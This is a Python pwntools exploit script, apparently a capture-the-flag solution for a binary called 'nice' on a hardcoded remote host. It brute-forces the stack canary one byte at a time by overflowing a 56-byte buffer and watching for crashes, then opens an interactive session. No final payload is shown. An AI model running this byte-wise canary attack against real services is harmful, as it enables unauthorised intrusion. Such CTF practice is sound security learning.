#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.41.207.206 --port 17012 ./nice
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./nice')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.41.207.206'
port = int(args.PORT or 17012)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv,aslr=0, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvuntil("port ")
port = io.recvline()[:-1]
print "port",port
if args.LOCAL:
    host = 'localhost'

def cannary(p,host1,port1):
    
    for i in range(256):
        try:
            io1 = connect(host1, port1,level='error')
            io1.send(p + chr(i))
            io1.recvline()
            io1.recvline()
        except:
            return i
            
p = "a"*56
can ='\x00'
for i in range(7):
    temp = cannary(p+can, host, port)
    print temp
    can += chr(temp)

print u64(can)
print hex(u64(can))

io.interactive()

